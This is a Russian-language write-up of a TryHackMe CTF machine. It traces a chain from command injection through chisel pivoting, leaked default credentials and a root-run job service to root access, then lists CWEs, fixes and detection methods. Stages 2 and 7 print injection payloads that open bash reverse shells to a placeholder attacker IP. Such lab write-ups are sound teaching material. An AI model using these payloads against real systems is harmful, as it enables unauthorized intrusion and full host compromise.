# Infinity Pool (TryHackMe, Hacker Holidays) — write-up

## Summary
Многоступенчатая машина: от command injection в веб-приложении до root через цепочку
внутренних сервисов (pivoting). Цепочка: command injection (edge) → reverse shell →
recon внутренних сервисов → chisel (проброс портов) → watchtower отдаёт креды →
FreePBX отдаёт automation key → command injection в сервисе automation (от root) → root.
Корневой мотив всей машины — доверие: вводу пользователя (2× command injection),
сетевой позиции (auth «by network position»), дефолтным кредам, внутренним сервисам.

## Архитектура (3 сервиса, "Closed Circuit")
- cc-edge — публичный веб (:80, gunicorn/Flask, User=web). Точка входа.
- cc-watchtower — внутренняя ops-консоль (127.0.0.1:3000, User=svc-watch).
- cc-automation — внутренний job-runner (127.0.0.1:9000, User=root), /jobs/export.
Внутренние сервисы слушают loopback → снаружи недоступны, видны лишь изнутри.

## Этап 1 — Recon
- nmap: веб на :80 (gunicorn).
- Страница /status с функцией ping.

## Этап 2 — Точка входа: Command Injection (edge)
Форма ping шлёт POST /internal/netcheck, параметр host. Сервер выполняет
`ping -c 1 {host}` через shell без санитизации → command injection.
PoC:
    host=127.0.0.1; id        # ; разрывает команду → id выполняется → RCE подтверждён
Reverse shell:
    # Kali: nc -lvnp 4444
    host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
→ shell как web → user.txt.

## Этап 3 — Recon изнутри
    ps aux | grep root   → внутренние сервисы от root на localhost:
                           automation (127.0.0.1:9000), watchtower (127.0.0.1:3000)
Слушают loopback (снаружи не видны), от root → цель privesc.

## Этап 4 — Pivoting: chisel
    # Kali (сервер):
    chisel server -p 9999 --reverse
    # цель (клиент):
    ./chisel client <KALI_IP>:9999 R:3000:127.0.0.1:3000 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000
Теперь на Kali 127.0.0.1:3000/:8080/:9000 = внутренние сервисы цели.

## Этап 5 — watchtower отдаёт секреты (auth by network position)
watchtower (:3000) /api/config отдаёт конфиг без пароля — доверяет тому, что запрос
с loopback («authenticated by network position»). В конфиге:
- креды FreePBX UCP (FreePBXUCPTemplateCreator / St4yN0t1c3d_2026), с пометкой
  «default template creds — ROTATE» (дефолтные, не сменены);
- endpoint automation (127.0.0.1:9000).

## Этап 6 — FreePBX отдаёт automation key
FreePBX UCP (:8080), вход с найденными кредами → находится automation key (Bearer-токен).

## Этап 7 — Финал: Command Injection в automation (от root)
automation (:9000) POST /jobs/export требует Authorization: Bearer <key>, принимает
параметр report. Сервер подставляет report в команду архивации (tar ... {report}) без
санитизации → снова command injection. Сервис работает от root → команда от root.
PoC:
    POST /jobs/export
    Authorization: Bearer <automation_key>
    Content-Type: application/json

    {"report": "x; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4445 0>&1'"}
→ reverse shell от root → root.txt.

## Root cause (по этапам)
1. edge: ввод (host) в shell-команду без экранирования → command injection. CWE-78.
2. watchtower: auth «by network position» (доверие loopback) вместо проверки прав;
   секреты в открытом виде в /api/config. CWE-306 / CWE-522.
3. FreePBX: дефолтные креды не сменены. CWE-1392.
4. automation: ввод (report) в tar без экранирования → command injection; сервис от
   root (избыточные права). CWE-78 + CWE-250.
5. Сквозное: секреты утекают между сервисами; внутренние сервисы = «доверенные».

## CWE
- CWE-78 — OS Command Injection (edge, automation)
- CWE-306 — Missing Authentication for Critical Function (watchtower)
- CWE-522 — Insufficiently Protected Credentials (секреты в config)
- CWE-1392 — Use of Default Credentials (FreePBX)
- CWE-250 — Execution with Unnecessary Privileges (automation от root)

## Severity
Critical. Полная компрометация хоста (root) из неаутентифицированной точки входа.

## Impact
Полный контроль над сервером (root). Демонстрирует, как несколько «средних» проблем
(инъекция + слабая внутренняя auth + дефолтные креды + сервис от root) складываются
в критическую цепочку.

## Fix (по этапам)
1. Command injection (edge, automation): не подставлять ввод в shell —
   subprocess.run([...], shell=False); для ping валидация host (allowlist-формат).
2. watchtower: не доверять сетевой позиции — реальная аутентификация (токен/mTLS).
3. Секреты: не хранить в открытом виде в API-ответах; secrets manager/vault.
4. FreePBX: сменить дефолтные креды.
5. automation: не запускать от root (least privilege) + фикс инъекции.
6. Сквозное: аутентификация между внутренними сервисами (zero trust).
Fix edge: не передавать ввод в shell (subprocess.run(..., shell=False))

## Detection (как поймать в пайплайне)
- SAST: data-flow — ввод (host, report) → конкатенация → subprocess(shell=True)/os.system.
- DAST: Burp — инъекция ;, |, $() в host/report, детект по выполнению/времени.
- SCA/config: сканеры дефолтных кредов, проверка сервисов от root, аудит секретов в конфигах.
- SDLC: command injection рождается на Coding (shell=True), ловится на code review
  (grep os.system, shell=True) и Testing. Auth-by-position и сервис-от-root — на Design.

## Инструменты
nmap, gobuster, nc (listener), chisel (pivoting), curl, Burp. Reverse shell (bash /dev/tcp).

## Уроки
- Внутренние сервисы (localhost) — отдельная поверхность; недоступность снаружи ≠ безопасность.
- Секреты утекают между сервисами (config одного отдаёт креды другого).
- «Authenticated by network position» — антипаттерн: loopback ≠ авторизован.
- Одна уязвимость (command injection) на разных уровнях; во внутреннем сервисе от root — критична.
- Цепочка «средних» проблем = critical. Защита рвёт цепочку на каждом звене.